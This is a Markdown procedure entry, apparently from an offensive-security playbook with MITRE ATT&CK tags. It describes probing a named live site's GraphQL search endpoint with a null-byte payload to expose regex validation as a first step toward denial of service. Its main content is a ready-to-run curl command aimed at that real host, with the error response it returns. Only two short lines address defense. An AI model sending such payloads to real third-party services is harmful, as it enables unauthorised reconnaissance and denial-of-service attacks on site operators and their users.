---
tags:
  - regex
  - probe
  - null-byte
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/probe-null-byte]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:25:53.218Z'
sub_techniques: []
id: 71efc447-74c7-4843-a1cf-9bc31d7dee76
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Probe-Regex-Usage-with-Null-Byte

## Summary

This procedure injects a null byte into the GraphQL search query to trigger error messages that reveal regex validation on the 'q' parameter.

## Description

By sending '\u0000)' in the 'q' field, the backend's regex check (e.g., /(?=.*\u0000)/) exposes its presence through error details. This confirms the vulnerability to regex manipulation in the Apollo Server on Node.js.

## Requirements

1. Access to the GraphQL endpoint
2. curl for payload delivery
3. Knowledge of Unicode escaping for null bytes

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to block null bytes early
- Log and alert on regex validation errors

## Objectives

1. Expose regex processing in error responses
2. Identify restrictions on special characters
3. Build toward crafting exploitative patterns

## Instructions

### Step 1: Inject Null Byte Payload

**Context**: Test for null byte handling to uncover regex involvement.

**Command** ([[commands/probe-null-byte]]):
```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

> Error response indicates regex check: 'value (?=.*\u0000) must not contain null bytes'.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/probe-null-byte]]

## Tools Used

- [[tools/curl]]

## Tags

- regex
- probe
- null-byte
